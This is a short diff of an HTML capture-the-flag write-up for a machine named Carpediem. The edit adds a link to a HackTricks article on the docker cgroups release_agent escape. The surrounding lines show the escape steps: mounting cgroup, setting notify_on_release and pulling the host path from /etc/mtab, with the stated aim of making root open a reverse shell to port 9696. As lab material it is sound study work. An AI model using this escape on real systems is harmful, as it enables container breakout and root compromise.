@@ -857,7 +857,9 @@ capsh --decode=00000000a00425fb
 <p><code>mount -t cgroup -o rdma cgroup /mnt</code></p>
 <p><img src="mount_worked.png" alt="Mount Worked"></p>
 <h3 id="getting-root-on-carpediem">Getting Root On Carpediem</h3>
-<p>Mounting <em>cgroup</em> has worked, so now I&rsquo;ll abuse that to escape from docker and make <em>root</em> execute a reverse shell back to hflaccus listening on port <em>9696</em>:</p>
+<p>Mounting <em>cgroup</em> has worked, so now I&rsquo;ll abuse that to 
+
+<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/docker-release_agent-cgroups-escape#breaking-down-the-proof-of-concept" target="_blank"><em>escape from docker</em></a> and make <em>root</em> execute a reverse shell back to hflaccus listening on port <em>9696</em>:</p>
 <pre tabindex="0"><code>mkdir /mnt/x
 echo 1 &gt; /mnt/x/notify_on_release
 host_path=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`
